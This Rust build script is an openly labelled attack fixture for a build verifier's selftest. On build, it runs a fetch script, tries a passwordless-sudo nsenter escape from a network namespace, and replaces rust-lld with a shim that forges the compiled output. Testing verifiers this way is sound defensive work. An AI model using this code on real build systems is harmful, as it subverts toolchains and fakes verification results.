// ATTACK FIXTURE A (OneScan selftest). MALICIOUS ON PURPOSE.
// 1. Fetch the on-chain Lockbox template: first directly, then by escaping a network namespace with
//    passwordless sudo: `sudo -n nsenter --net=/proc/1/ns/net python3 steal.py` (the cold-review bypass).
// 2. If that worked, replace the toolchain's rust-lld with a shim that writes the stolen bytes as the link
//    output, so target/wasm32-unknown-unknown/release/attack_a.wasm IS the on-chain binary.
// Under the hardened verifier (docker --network none, no sudo, read-only toolchain) every step fails.
use std::os::unix::fs::PermissionsExt;
use std::path::PathBuf;
use std::process::Command;
use std::{env, fs};

fn ok(c: &mut Command) -> bool {
    c.status().map(|s| s.success()).unwrap_or(false)
}

fn main() {
    let dir = PathBuf::from(env::var("CARGO_MANIFEST_DIR").unwrap());
    let stolen = PathBuf::from(env::var("OUT_DIR").unwrap()).join("stolen.wasm");
    let steal = dir.join("steal.py");
    let how = if ok(Command::new("python3").arg(&steal).arg(&stolen)) {
        "direct"
    } else if ok(Command::new("sudo").args(["-n", "nsenter", "--net=/proc/1/ns/net", "python3"]).arg(&steal).arg(&stolen)) {
        "sudo nsenter"
    } else {
        "none"
    };
    println!("cargo:warning=attack a: fetch via {how}");
    if how == "none" {
        return;
    }
    let rustc = env::var("RUSTC").unwrap_or_else(|_| "rustc".into());
    let sysroot = Command::new(&rustc).args(["--print", "sysroot"]).output().unwrap().stdout;
    let bin = PathBuf::from(String::from_utf8_lossy(&sysroot).trim()).join("lib/rustlib/x86_64-unknown-linux-gnu/bin");
    let lld = bin.join("rust-lld");
    let real = bin.join("rust-lld.real");
    if !real.exists() && fs::rename(&lld, &real).is_err() {
        println!("cargo:warning=attack a: cannot replace rust-lld");
        return;
    }
    let shim = format!(
        "#!/bin/sh\nout=\"\"; prev=\"\"\nfor a in \"$@\"; do [ \"$prev\" = \"-o\" ] && out=\"$a\"; prev=\"$a\"; done\n\
         case \"$out\" in *attack_a*) cp '{}' \"$out\"; exit 0;; esac\nexec '{}' \"$@\"\n",
        stolen.display(),
        real.display()
    );
    if fs::write(&lld, shim).is_ok() {
        let _ = fs::set_permissions(&lld, fs::Permissions::from_mode(0o755));
        println!("cargo:warning=attack a: rust-lld replaced by a shim");
    } else {
        println!("cargo:warning=attack a: cannot write the rust-lld shim");
    }
}
